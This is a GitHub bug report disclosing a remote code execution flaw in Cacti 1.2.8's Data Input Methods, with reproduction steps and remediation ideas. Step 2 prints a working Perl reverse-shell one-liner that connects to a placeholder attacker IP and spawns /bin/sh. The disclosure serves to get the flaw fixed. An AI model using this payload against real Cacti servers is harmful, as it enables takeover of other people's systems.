## Description

![@0xfatty](https://avatars.githubusercontent.com/u/21222141?v=4&size=48)[0xfatty](https://github.com/0xfatty)opened [on Jan 14, 2020](https://github.com/Cacti/cacti/issues/3186#issue-549865124)

**Describe the bug**

Input validation error in data\_input.php leads to Remote Code Execution via Input String (Script/Command) edit actions. By default, Cacti was installed with several Data Input Methods. Some of them was created using Script/Command input type. An attacker will be able to edit the Input String to insert malicious code and take control of the server.

Cacti version: Latest (1.2.8)

**To Reproduce**

Steps to reproduce the behavior:

1. After logged in, navigate to Data Collection -> Data Input Methods -> Unix - Ping Host
2. By default, Input String was specified as: `perl <path_cacti>/scripts/ping.pl <hostname>`. Let's append a malicious perl script in front of current script:

`perl -e 'use Socket;$i="**ACTTACKER-IP**";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'; perl <path_cacti>/scripts/ping.pl <hostname>`

3. By default, Unix -Ping Host data input method is being used by Unix - Ping Latency Graph template. This means we can create Unix - Ping Latency in current device and gain Remote Code Execution

**Expected behavior**

* By default, Ping Host works as a feature to check if a host is up/down. With the malicious code appended into the Input String, the server will make a call back to Attacker's machine first.

**Impact**

* The vulnerability would let an authorized user take control of the server. Attack will then be able to take down the system as well as use the system for malicious purposes.

**Screenshots**

If applicable, add screenshots to help explain your problem.

* Create new graph in device: <https://imgur.com/C8zF3Py>
* Reverse shell connection: <https://imgur.com/97HgO0g>

**Desktop (please complete the following information):**

* OS: Kali Linux, Ubuntu
* Browser : Firefox, Chrome
* Version: Firefox 72.0, Chrome 79.0.3945.117

**Remediation**

* I would think about two (2) solutions:

  1 - Using regex to catch all other strings different from expected string

  2 - Hard-coding perl script into source-code and force the application to take only 1 filtered input (hostname).
